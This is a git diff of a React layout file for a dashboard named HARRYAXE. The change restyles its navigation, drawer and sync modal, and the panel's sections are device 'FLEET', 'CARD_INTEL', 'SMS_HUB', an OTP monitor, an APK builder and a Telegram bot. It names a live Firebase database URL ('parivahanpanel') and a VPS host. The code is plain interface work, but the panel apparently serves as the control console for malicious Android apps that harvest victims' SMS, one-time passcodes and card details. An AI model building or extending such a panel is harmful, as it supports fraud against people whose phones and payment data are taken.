@@ -4,12 +4,9 @@ import { useLocation, Link } from "wouter";
 import { useSearch } from "@/lib/search";
 import {
   LogOut,
-  Zap,
   Search,
   Sun,
   Moon,
-  ChevronsLeft,
-  ChevronsRight,
   Smartphone,
   CreditCard,
   MessageSquare,
@@ -24,6 +21,9 @@ import {
   Radio,
   ExternalLink,
   ShieldCheck,
+  Zap,
+  Check,
+  RefreshCw,
   type LucideIcon,
 } from "lucide-react";
 
@@ -42,32 +42,32 @@ function getInitialTheme(): "dark" | "light" {
 interface NavItem {
   href: string;
   label: string;
+  badge?: string;
   icon: LucideIcon;
   adminOnly?: boolean;
 }
 
-// ── Primary 3 Core Navigation Items as requested ──────────────────────────
-const primaryLinks: NavItem[] = [
-  { href: "/dashboard", label: "Devices", icon: Smartphone },
-  { href: "/cards", label: "Main Cards", icon: CreditCard },
-  { href: "/all-sms", label: "Messages", icon: MessageSquare },
+// ── Variation 3 Navigation Links ──────────────────────────────────────────
+const navLinks: NavItem[] = [
+  { href: "/dashboard", label: "FLEET", icon: Smartphone },
+  { href: "/cards", label: "CARD_INTEL", icon: CreditCard },
+  { href: "/all-sms", label: "SMS_HUB", icon: MessageSquare },
+  { href: "/subscriptions", label: "ACCESS", icon: Users, adminOnly: true },
+  { href: "/profile", label: "SYS_CONFIG", icon: Settings },
 ];
 
-// ── Secondary Tools (Cleanly accessible in More Drawer / Sidebar) ────────
+// ── Secondary Tools in "MORE" Drawer ─────────────────────────────────────
 const secondaryLinks: NavItem[] = [
   { href: "/otps", label: "OTP Monitor", icon: KeyRound },
-  { href: "/firebases", label: "Firebases & VPS", icon: Flame },
+  { href: "/firebases", label: "Firebases & Cluster", icon: Flame },
   { href: "/telegram", label: "Telegram Bot", icon: Send },
   { href: "/apk-studio", label: "APK Studio", icon: Package },
-  { href: "/subscriptions", label: "User Access", icon: Users, adminOnly: true },
-  { href: "/profile", label: "Settings", icon: Settings },
 ];
 
 export function Layout({ children }: { children: React.ReactNode }) {
   const { logout, isAdmin, username } = useAuth();
   const [location, setLocation] = useLocation();
   const [theme, setTheme] = useState<"dark" | "light">(getInitialTheme);
-  const [collapsed, setCollapsed] = useState(false);
   const [moreOpen, setMoreOpen] = useState(false);
   const [vpsModalOpen, setVpsModalOpen] = useState(false);
   const { query, setQuery, searchRef, focusSearch } = useSearch();
@@ -88,7 +88,6 @@ export function Layout({ children }: { children: React.ReactNode }) {
         focusSearch();
       }
       if (e.key === "Escape") {
-        setCollapsed(false);
         setMoreOpen(false);
         setVpsModalOpen(false);
       }
@@ -107,404 +106,328 @@ export function Layout({ children }: { children: React.ReactNode }) {
     return location === href || (href !== "/" && location.startsWith(href + "/"));
   };
 
-  const visibleSecondary = secondaryLinks.filter((l) => !l.adminOnly || isAdmin);
-
-  const ThemeButton = ({ className = "" }: { className?: string }) => (
-    <button
-      onClick={() => setTheme((t) => (t === "dark" ? "light" : "dark"))}
-      aria-label="Toggle theme"
-      title={theme === "dark" ? "Switch to light mode" : "Switch to dark mode"}
-      className={`flex items-center justify-center w-9 h-9 rounded-full text-muted-foreground hover:text-foreground hover:bg-muted transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${className}`}
-    >
-      {theme === "dark" ? (
-        <Sun className="w-[18px] h-[18px]" />
-      ) : (
-        <Moon className="w-[18px] h-[18px]" />
-      )}
-    </button>
-  );
-
-  const VpsSyncBadge = () => (
-    <button
-      onClick={() => setVpsModalOpen(true)}
-      title="VPS & Panel Sync Status"
-      className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/20 text-[11px] font-mono text-emerald-600 dark:text-emerald-400 transition-all"
-    >
-      <span className="relative flex h-2 w-2">
-        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-        <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
-      </span>
-      <span className="font-semibold tracking-wide">VPS Synced</span>
-    </button>
-  );
-
-  const SearchBox = () => (
-    <div className="relative w-full">
-      <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-      <input
-        ref={searchRef}
-        data-search
-        type="text"
-        value={query}
-        onChange={(e) => setQuery(e.target.value)}
-        placeholder="Search devices, cards, SMS, OTPs..."
-        aria-label="Global search"
-        className="w-full bg-card/70 border border-card-border rounded-xl py-2 pl-9 pr-14 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/60 transition-all"
-      />
-      <kbd className="absolute right-3 top-1/2 -translate-y-1/2 hidden sm:inline-flex items-center px-1.5 py-0.5 rounded-md bg-muted border border-card-border text-[10px] font-mono text-muted-foreground">
-        Ctrl K
-      </kbd>
-    </div>
-  );
-
-  const UserChip = ({ showLabel = true }: { showLabel?: boolean }) => (
-    <div className="flex items-center gap-2 text-xs font-medium text-muted-foreground">
-      <span className="w-6 h-6 rounded-full bg-primary/20 text-primary border border-primary/30 flex items-center justify-center text-[10px] font-bold uppercase shrink-0">
-        {(username || "U").slice(0, 1)}
-      </span>
-      {showLabel && (
-        <span className="truncate max-w-[100px]">
-          {isAdmin ? "Admin" : username || "User"}
-        </span>
-      )}
-    </div>
-  );
+  const visibleNav = navLinks.filter((l) => !l.adminOnly || isAdmin);
 
   return (
-    <div className="min-h-dvh bg-background text-foreground font-sans md:flex">
-      {/* ── Desktop sidebar (collapsible) ── */}
-      <aside
-        className={`hidden md:flex flex-col sticky top-0 h-dvh bg-card border-r border-card-border transition-[width] duration-200 shrink-0 ${
-          collapsed ? "w-16" : "w-64"
-        }`}
-      >
-        <div
-          className={`flex items-center ${collapsed ? "justify-center" : "justify-between"} px-3 py-5 mb-2`}
-        >
-          <Link
-            href="/dashboard"
-            title="HARRYAXE"
-            className={`flex items-center gap-3 min-w-0 ${collapsed ? "justify-center w-full" : "px-1"}`}
-          >
-            <span className="brand-mark w-9 h-9 rounded-xl shrink-0 shadow-sm shadow-primary/30 flex items-center justify-center bg-primary text-primary-foreground">
-              <Zap className="w-4 h-4" />
-            </span>
-            {!collapsed && (
-              <span className="flex flex-col leading-tight min-w-0">
-                <span className="font-display font-bold text-lg tracking-tight text-foreground truncate">
-                  HARRYAXE
-                </span>
-                <span className="text-[10px] text-muted-foreground font-medium uppercase tracking-wider">
-                  Control Fleet
-                </span>
-              </span>
-            )}
-          </Link>
-          {!collapsed && (
-            <button
-              onClick={() => setCollapsed(true)}
-              aria-label="Collapse sidebar"
-              className="flex items-center justify-center w-8 h-8 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors shrink-0"
-            >
-              <ChevronsLeft className="w-4 h-4" />
-            </button>
-          )}
-        </div>
-
-        {collapsed && (
-          <button
-            onClick={() => setCollapsed(false)}
-            aria-label="Expand sidebar"
-            className="mx-2 mb-2 flex items-center justify-center w-8 h-8 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors self-center"
-          >
-            <ChevronsRight className="w-4 h-4" />
-          </button>
-        )}
-
-        <nav className="flex-1 overflow-y-auto overflow-x-hidden px-3 space-y-6">
-          {/* Main Navigation: Devices, Main Cards, Messages */}
-          <div>
-            {!collapsed && (
-              <p className="px-2 pb-2 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">
-                Core Fleet
-              </p>
-            )}
-            <div className="space-y-1.5">
-              {primaryLinks.map(({ href, label, icon: Icon }) => {
-                const active = isActive(href);
-                return (
-                  <Link
-                    key={href}
-                    href={href}
-                    title={collapsed ? label : undefined}
-                    aria-current={active ? "page" : undefined}
-                    className={`flex items-center gap-3 rounded-xl transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
-                      collapsed ? "justify-center p-2.5" : "px-3.5 py-3"
-                    } ${
-                      active
-                        ? "bg-primary text-primary-foreground font-semibold shadow-sm shadow-primary/25"
-                        : "text-muted-foreground hover:text-foreground hover:bg-muted/70 font-medium"
-                    }`}
-                  >
-                    <Icon className={collapsed ? "h-5 w-5" : "h-[18px] w-[18px] shrink-0"} />
-                    {!collapsed && <span className="text-sm">{label}</span>}
-                  </Link>
-                );
-              })}
+    <div className="min-h-dvh flex flex-col bg-background text-foreground font-sans relative">
+      {/* ── Variation 3 Top Bar Header ── */}
+      <header className="sticky top-0 z-40 border-b border-border bg-background/85 backdrop-blur-xl px-4 sm:px-8 py-3.5 flex items-center justify-between gap-4 transition-all">
+        {/* Left: Brand Identity */}
+        <div className="flex items-center gap-6 shrink-0">
+          <Link href="/dashboard" className="flex items-center gap-3 group">
+            <div className="w-8 h-8 rounded bg-primary text-primary-foreground font-display font-black text-lg flex items-center justify-center shadow-[0_0_15px_rgba(0,119,255,0.6)] group-hover:scale-105 transition-transform">
+              H
             </div>
-          </div>
-
-          {/* Secondary Tools */}
-          <div>
-            {!collapsed && (
-              <p className="px-2 pb-2 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/60">
-                Management & Tools
-              </p>
-            )}
-            <div className="space-y-1">
-              {visibleSecondary.map(({ href, label, icon: Icon }) => {
-                const active = isActive(href);
-                return (
-                  <Link
-                    key={href}
-                    href={href}
-                    title={collapsed ? label : undefined}
-                    aria-current={active ? "page" : undefined}
-                    className={`flex items-center gap-2.5 rounded-lg transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
-                      collapsed ? "justify-center p-2" : "px-3 py-2"
-                    } ${
-                      active
-                        ? "bg-muted text-foreground font-semibold"
-                        : "text-muted-foreground hover:text-foreground hover:bg-muted/50 text-xs"
-                    }`}
-                  >
-                    <Icon className={collapsed ? "h-4 w-4" : "h-4 w-4 shrink-0"} />
-                    {!collapsed && <span>{label}</span>}
-                  </Link>
-                );
-              })}
-            </div>
-          </div>
-        </nav>
-
-        {/* Sidebar Footer */}
-        <div className="pt-3 pb-4 border-t border-card-border space-y-2 px-3">
-          {!collapsed && (
-            <div className="px-2 pb-1">
-              <VpsSyncBadge />
-            </div>
-          )}
-          <div
-            className={`flex items-center gap-2 py-1 text-xs font-medium text-muted-foreground ${
-              collapsed ? "justify-center" : "px-2"
-            }`}
-          >
-            <UserChip showLabel={!collapsed} />
-            {!collapsed && (
-              <span className="ml-auto">
-                <ThemeButton />
-              </span>
-            )}
-          </div>
-          <button
-            onClick={handleLogout}
-            title={collapsed ? "Logout" : undefined}
-            aria-label="Logout"
-            className={`flex items-center gap-2.5 rounded-lg transition-colors w-full focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
-              collapsed ? "justify-center p-2" : "px-3 py-2 text-xs"
-            } text-muted-foreground hover:text-destructive hover:bg-destructive/10`}
-          >
-            <LogOut className="w-4 h-4 shrink-0" />
-            {!collapsed && <span>Logout</span>}
-          </button>
-        </div>
-      </aside>
-
-      {/* ── Main viewport column ── */}
-      <div className="flex-1 min-w-0 flex flex-col">
-        {/* Desktop top header */}
-        <header className="hidden md:flex sticky top-0 z-30 glass-card border-b border-card-border items-center gap-4 px-6 h-16">
-          <div className="w-full max-w-md flex-1">
-            <SearchBox />
-          </div>
-          <div className="ml-auto flex items-center gap-3">
-            <VpsSyncBadge />
-            <UserChip />
-            <ThemeButton />
-          </div>
-        </header>
-
-        {/* Mobile top header (Clean, high-contrast, uncluttered) */}
-        <header className="md:hidden sticky top-0 z-30 bg-card/90 backdrop-blur-md border-b border-card-border">
-          <div className="flex items-center justify-between px-4 h-14">
-            <Link href="/dashboard" className="flex items-center gap-2">
-              <span className="w-7 h-7 rounded-lg bg-primary text-primary-foreground flex items-center justify-center shadow-sm shadow-primary/30">
-                <Zap className="w-3.5 h-3.5" />
-              </span>
-              <span className="font-display font-bold text-base tracking-tight text-foreground">
+            <div className="flex flex-col">
+              <span className="font-display text-xl tracking-tight text-foreground font-bold leading-none">
                 HARRYAXE
               </span>
-            </Link>
-            <div className="flex items-center gap-2">
-              <VpsSyncBadge />
-              <ThemeButton />
-              <button
-                onClick={() => setMoreOpen(true)}
-                aria-label="Open menu"
-                className="w-9 h-9 flex items-center justify-center rounded-full text-muted-foreground hover:text-foreground hover:bg-muted"
-              >
-                <MoreHorizontal className="w-5 h-5" />
-              </button>
+              <span className="meta text-[9px] text-muted-foreground tracking-widest mt-0.5 hidden sm:block">
+                FLEET_INTELLIGENCE
+              </span>
             </div>
-          </div>
-          <div className="px-4 pb-2.5">
-            <SearchBox />
-          </div>
-        </header>
+          </Link>
 
-        {/* Page content */}
-        <main className="flex-1 min-w-0 overflow-x-hidden px-3.5 sm:px-6 py-4 md:py-5 pb-24 md:pb-6">
-          <div className="max-w-7xl mx-auto">{children}</div>
-        </main>
-
-        {/* ── Mobile Optimized 3-Tab Bottom Navigation Bar ── */}
-        <nav
-          aria-label="Mobile Navigation"
-          className="md:hidden fixed bottom-0 left-0 right-0 z-40 bg-card/95 backdrop-blur-md border-t border-card-border px-3 py-1.5 pb- safe flex items-center justify-around shadow-lg"
-        >
-          {primaryLinks.map(({ href, label, icon: Icon }) => {
-            const active = isActive(href);
-            return (
-              <Link
-                key={href}
-                href={href}
-                aria-current={active ? "page" : undefined}
-                className={`flex flex-col items-center justify-center min-w-[72px] h-[52px] rounded-xl px-2 transition-all ${
-                  active
-                    ? "text-primary font-bold bg-primary/10"
-                    : "text-muted-foreground hover:text-foreground font-medium"
-                }`}
-              >
-                <Icon className={`w-5 h-5 mb-0.5 ${active ? "text-primary scale-110" : ""}`} />
-                <span className="text-[11px] leading-tight tracking-tight">{label}</span>
-              </Link>
-            );
-          })}
-          <button
-            onClick={() => setMoreOpen(true)}
-            aria-label="More tools"
-            className="flex flex-col items-center justify-center min-w-[72px] h-[52px] rounded-xl px-2 text-muted-foreground hover:text-foreground font-medium transition-all"
-          >
-            <MoreHorizontal className="w-5 h-5 mb-0.5" />
-            <span className="text-[11px] leading-tight tracking-tight">More</span>
-          </button>
-        </nav>
-      </div>
-
-      {/* ── Mobile "More" Drawer / Modal ── */}
-      {moreOpen && (
-        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex flex-col justify-end md:hidden animate-in fade-in duration-150">
-          <div className="bg-card border-t border-card-border rounded-t-2xl p-5 max-h-[80vh] overflow-y-auto space-y-4 animate-in slide-in-from-bottom duration-200">
-            <div className="flex items-center justify-between pb-3 border-b border-card-border">
-              <div className="flex items-center gap-2">
-                <ShieldCheck className="w-5 h-5 text-primary" />
-                <h3 className="font-semibold text-base text-foreground">Management & Tools</h3>
-              </div>
-              <button
-                onClick={() => setMoreOpen(false)}
-                className="p-1.5 rounded-lg text-muted-foreground hover:bg-muted"
-              >
-                <X className="w-5 h-5" />
-              </button>
-            </div>
-
-            <div className="grid grid-cols-2 gap-2.5">
-              {visibleSecondary.map(({ href, label, icon: Icon }) => (
+          {/* Desktop Nav Links */}
+          <nav className="hidden lg:flex items-center gap-6 ml-2">
+            {visibleNav.map((link) => {
+              const active = isActive(link.href);
+              return (
                 <Link
-                  key={href}
-                  href={href}
-                  onClick={() => setMoreOpen(false)}
-                  className={`flex items-center gap-2.5 p-3 rounded-xl border transition-colors ${
-                    isActive(href)
-                      ? "bg-primary/10 border-primary/30 text-primary font-semibold"
-                      : "bg-card border-card-border text-foreground hover:bg-muted"
+                  key={link.href}
+                  href={link.href}
+                  className={`font-mono text-xs uppercase tracking-wider transition-all duration-150 py-1 border-b-2 ${
+                    active
+                      ? "text-primary border-primary font-bold shadow-[0_4px_12px_-4px_rgba(0,119,255,0.5)]"
+                      : "text-foreground/70 hover:text-foreground border-transparent hover:border-border"
                   }`}
                 >
-                  <Icon className="w-4 h-4 text-primary" />
-                  <span className="text-xs font-medium">{label}</span>
+                  {link.label}
                 </Link>
-              ))}
+              );
+            })}
+
+            {/* More tools dropdown / drawer trigger */}
+            <button
+              onClick={() => setMoreOpen(true)}
+              className="font-mono text-xs uppercase tracking-wider text-muted-foreground hover:text-foreground transition-colors flex items-center gap-1"
+            >
+              MORE <MoreHorizontal className="w-3.5 h-3.5" />
+            </button>
+          </nav>
+        </div>
+
+        {/* Center: Search input (Medium+ screens) */}
+        <div className="hidden md:flex flex-1 max-w-xs xl:max-w-md mx-2">
+          <div className="relative w-full">
+            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
+            <input
+              ref={searchRef}
+              data-search
+              type="text"
+              value={query}
+              onChange={(e) => setQuery(e.target.value)}
+              placeholder="SEARCH_TELEMETRY (CTRL+K)..."
+              className="w-full bg-card/60 border border-border rounded px-3 py-1.5 pl-8 pr-12 text-xs font-mono text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all"
+            />
+            <kbd className="absolute right-2 top-1/2 -translate-y-1/2 text-[9px] font-mono bg-muted/60 text-muted-foreground px-1.5 py-0.5 rounded border border-border">
+              ^K
+            </kbd>
+          </div>
+        </div>
+
+        {/* Right: Telemetry sync status, admin badge, actions */}
+        <div className="flex items-center gap-2.5 sm:gap-4 shrink-0">
+          {/* Live system sync telemetry indicator with pulsing ring */}
+          <button
+            onClick={() => setVpsModalOpen(true)}
+            title="Inspect VPS & Firebase Telemetry Sync"
+            className="flex items-center gap-2 px-2.5 py-1.5 rounded border border-border bg-card/40 hover:border-primary/50 transition-all cursor-pointer group"
+          >
+            <span className="status-indicator">
+              <span className="ping-ring" />
+              <span className="status-dot online" />
+            </span>
+            <span className="meta text-[#00FFCC] font-bold text-[10px] hidden sm:inline">
+              • SYSTEM_SYNCED
+            </span>
+          </button>
+
+          {/* Admin badge */}
+          <button
+            onClick={() => setLocation("/profile")}
+            className="action-btn text-[10px] font-bold py-1 px-2.5"
+            title="User Profile & System Settings"
+          >
+            {isAdmin ? "E_ADMIN" : (username || "USER").toUpperCase()}
+          </button>
+
+          {/* Theme switcher */}
+          <button
+            onClick={() => setTheme((t) => (t === "dark" ? "light" : "dark"))}
+            className="p-1.5 rounded border border-border text-muted-foreground hover:text-foreground hover:border-primary/50 transition-colors"
+            title="Toggle Theme"
+          >
+            {theme === "dark" ? <Sun className="w-3.5 h-3.5" /> : <Moon className="w-3.5 h-3.5" />}
+          </button>
+
+          {/* Logout */}
+          <button
+            onClick={handleLogout}
+            className="p-1.5 rounded border border-border text-muted-foreground hover:text-destructive hover:border-destructive/40 transition-colors"
+            title="Sign Out"
+          >
+            <LogOut className="w-3.5 h-3.5" />
+          </button>
+        </div>
+      </header>
+
+      {/* ── Main Workspace Body ── */}
+      <main className="flex-1 w-full max-w-[1700px] mx-auto p-4 sm:p-6 lg:p-8 pb-24 md:pb-8">
+        {children}
+      </main>
+
+      {/* ── Mobile Bottom Navigation Bar (Optimized for touch) ── */}
+      <nav className="lg:hidden fixed bottom-0 left-0 right-0 z-40 bg-background/95 backdrop-blur-lg border-t border-border px-2 py-1 flex items-center justify-around shadow-2xl">
+        <Link
+          href="/dashboard"
+          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
+            isActive("/dashboard") ? "text-primary font-bold" : "text-muted-foreground"
+          }`}
+        >
+          <Smartphone className="w-4 h-4" />
+          <span>FLEET</span>
+        </Link>
+        <Link
+          href="/cards"
+          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
+            isActive("/cards") ? "text-primary font-bold" : "text-muted-foreground"
+          }`}
+        >
+          <CreditCard className="w-4 h-4" />
+          <span>CARDS</span>
+        </Link>
+        <Link
+          href="/all-sms"
+          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
+            isActive("/all-sms") ? "text-primary font-bold" : "text-muted-foreground"
+          }`}
+        >
+          <MessageSquare className="w-4 h-4" />
+          <span>SMS</span>
+        </Link>
+        <button
+          onClick={() => setMoreOpen(true)}
+          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
+            moreOpen ? "text-primary font-bold" : "text-muted-foreground"
+          }`}
+        >
+          <MoreHorizontal className="w-4 h-4" />
+          <span>MORE</span>
+        </button>
+      </nav>
+
+      {/* ── "More Tools" Slide-Over Drawer ── */}
+      {moreOpen && (
+        <div className="fixed inset-0 z-50 flex">
+          <div
+            className="fixed inset-0 bg-black/70 backdrop-blur-sm transition-opacity"
+            onClick={() => setMoreOpen(false)}
+          />
+          <div className="relative ml-auto w-full max-w-sm h-full bg-card border-l border-border p-6 shadow-2xl flex flex-col justify-between overflow-y-auto z-10 animate-in slide-in-from-right duration-200">
+            <div>
+              <div className="flex items-center justify-between pb-4 border-b border-border mb-6">
+                <div>
+                  <span className="meta text-[10px] block">SYSTEM_UTILITIES</span>
+                  <h3 className="font-display text-xl font-bold text-foreground">
+                    Secondary_Tools
+                  </h3>
+                </div>
+                <button
+                  onClick={() => setMoreOpen(false)}
+                  className="p-2 rounded border border-border text-muted-foreground hover:text-foreground hover:border-primary/50"
+                >
+                  <X className="w-4 h-4" />
+                </button>
+              </div>
+
+              <div className="space-y-2">
+                <span className="meta text-[10px] text-muted-foreground block px-2 mb-1">
+                  TOOLS & INTEGRATIONS
+                </span>
+                {secondaryLinks.map((link) => {
+                  const active = isActive(link.href);
+                  const Icon = link.icon;
+                  return (
+                    <Link
+                      key={link.href}
+                      href={link.href}
+                      onClick={() => setMoreOpen(false)}
+                      className={`flex items-center gap-3 p-3 rounded border transition-all ${
+                        active
+                          ? "border-primary bg-primary/10 text-primary font-bold"
+                          : "border-border bg-background/50 text-foreground hover:border-border/80 hover:bg-muted/40"
+                      }`}
+                    >
+                      <Icon className="w-4 h-4 shrink-0" />
+                      <span className="font-mono text-xs font-semibold">{link.label}</span>
+                    </Link>
+                  );
+                })}
+
+                {isAdmin && (
+                  <Link
+                    href="/subscriptions"
+                    onClick={() => setMoreOpen(false)}
+                    className={`flex items-center gap-3 p-3 rounded border transition-all ${
+                      isActive("/subscriptions")
+                        ? "border-primary bg-primary/10 text-primary font-bold"
+                        : "border-border bg-background/50 text-foreground hover:border-border/80 hover:bg-muted/40"
+                    }`}
+                  >
+                    <Users className="w-4 h-4 shrink-0" />
+                    <span className="font-mono text-xs font-semibold">ACCESS (Users & Subscriptions)</span>
+                  </Link>
+                )}
+
+                <Link
+                  href="/profile"
+                  onClick={() => setMoreOpen(false)}
+                  className={`flex items-center gap-3 p-3 rounded border transition-all ${
+                    isActive("/profile")
+                      ? "border-primary bg-primary/10 text-primary font-bold"
+                      : "border-border bg-background/50 text-foreground hover:border-border/80 hover:bg-muted/40"
+                  }`}
+                >
+                  <Settings className="w-4 h-4 shrink-0" />
+                  <span className="font-mono text-xs font-semibold">SYS_CONFIG (Credentials & Firebase)</span>
+                </Link>
+              </div>
             </div>
 
-            <div className="pt-2 border-t border-card-border flex items-center justify-between">
-              <UserChip />
+            <div className="pt-6 border-t border-border">
+              <button
+                onClick={() => {
+                  setMoreOpen(false);
+                  setVpsModalOpen(true);
+                }}
+                className="w-full action-btn text-xs py-2.5 mb-2"
+              >
+                <Radio className="w-3.5 h-3.5 text-[#00FFCC]" />
+                TELEMETRY_SYNC_STATUS
+              </button>
               <button
                 onClick={handleLogout}
-                className="inline-flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-semibold text-destructive hover:bg-destructive/10"
+                className="w-full action-btn text-xs py-2 text-destructive hover:border-destructive hover:text-destructive"
               >
-                <LogOut className="w-4 h-4" /> Logout
+                <LogOut className="w-3.5 h-3.5" />
+                TERMINATE_SESSION
               </button>
             </div>
           </div>
         </div>
       )}
 
-      {/* ── VPS & Panel Sync Info Modal ── */}
+      {/* ── Telemetry & VPS Sync Modal ── */}
       {vpsModalOpen && (
-        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in duration-150">
-          <div className="bg-card border border-card-border rounded-2xl p-6 max-w-md w-full shadow-2xl space-y-4">
-            <div className="flex items-center justify-between">
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm animate-in fade-in">
+          <div className="w-full max-w-lg rounded-lg border border-border bg-card p-6 shadow-2xl relative">
+            <div className="flex items-center justify-between pb-3 border-b border-border mb-4">
               <div className="flex items-center gap-2">
-                <Radio className="w-5 h-5 text-emerald-500 animate-pulse" />
-                <h3 className="font-semibold text-base text-foreground">VPS & Panel Sync Status</h3>
+                <span className="status-dot online" />
+                <div>
+                  <span className="meta text-[9px]">DIAGNOSTIC_TELEMETRY</span>
+                  <h3 className="font-display text-lg font-bold text-foreground">
+                    Telemetry & VPS Sync
+                  </h3>
+                </div>
               </div>
               <button
                 onClick={() => setVpsModalOpen(false)}
-                className="p-1 rounded-lg text-muted-foreground hover:bg-muted"
+                className="p-1 rounded text-muted-foreground hover:text-foreground"
               >
                 <X className="w-4 h-4" />
               </button>
             </div>
 
-            <p className="text-xs text-muted-foreground">
-              Your panel is configured for real-time bi-directional synchronization with your VPS and primary Firebase cluster.
-            </p>
+            <div className="space-y-3 font-mono text-xs">
+              <div className="p-3 rounded bg-background/80 border border-border space-y-1">
+                <span className="meta text-[9px] block">PANEL_ORIGIN</span>
+                <p className="text-primary font-bold break-all">
+                  {typeof window !== "undefined" ? window.location.origin : "Auto-detected"}
+                </p>
+              </div>
 
-            <div className="space-y-2.5 bg-muted/40 p-3.5 rounded-xl border border-card-border text-xs font-mono">
-              <div className="flex justify-between items-center py-1 border-b border-card-border/50">
-                <span className="text-muted-foreground">Sync Status:</span>
-                <span className="text-emerald-500 font-semibold flex items-center gap-1">
-                  ● ACTIVE / SYNCED
-                </span>
+              <div className="p-3 rounded bg-background/80 border border-border space-y-1">
+                <span className="meta text-[9px] block">FIREBASE_REST_CLUSTER</span>
+                <p className="text-foreground break-all">
+                  https://ai-studio-parivahanpanelsy-6c13f1e6-6bb4-468a-bd85-63d32d32229e-default-rtdb.asia-southeast1.firebasedatabase.app
+                </p>
               </div>
-              <div className="flex justify-between items-center py-1 border-b border-card-border/50">
-                <span className="text-muted-foreground">VPS Host:</span>
-                <span className="text-foreground">panel.kimiaxe.com</span>
-              </div>
-              <div className="flex justify-between items-center py-1 border-b border-card-border/50">
-                <span className="text-muted-foreground">Firebase Cluster:</span>
-                <span className="text-foreground">axexodiweb-default-rtdb</span>
-              </div>
-              <div className="flex justify-between items-center py-1">
-                <span className="text-muted-foreground">Command Pipeline:</span>
-                <span className="text-foreground">clients/{`{id}`}/webhookEvent</span>
+
+              <div className="p-3 rounded bg-background/80 border border-border flex items-center justify-between">
+                <div>
+                  <span className="meta text-[9px] block">DATABASE_STATUS</span>
+                  <span className="text-[#00FFCC] font-bold">ONLINE & SYNCED</span>
+                </div>
+                <span className="status-dot online" />
               </div>
             </div>
 
-            <div className="flex gap-2 pt-1">
-              <a
-                href="https://panel.kimiaxe.com"
-                target="_blank"
-                rel="noreferrer"
-                className="flex-1 inline-flex items-center justify-center gap-1.5 h-9 rounded-xl bg-primary text-primary-foreground text-xs font-semibold hover:bg-primary/90 transition-all"
-              >
-                Open VPS Domain <ExternalLink className="w-3.5 h-3.5" />
-              </a>
+            <div className="mt-6 flex items-center justify-end gap-2">
               <button
                 onClick={() => setVpsModalOpen(false)}
-                className="px-4 h-9 rounded-xl border border-card-border text-xs font-semibold hover:bg-muted transition-all"
+                className="action-btn"
               >
-                Close
+                DISMISS
+              </button>
+              <button
+                onClick={() => {
+                  window.location.reload();
+                }}
+                className="action-btn primary"
+              >
+                RELOAD_STREAM
               </button>
             </div>
           </div>
@@ -513,4 +436,3 @@ export function Layout({ children }: { children: React.ReactNode }) {
     </div>
   );
 }
-
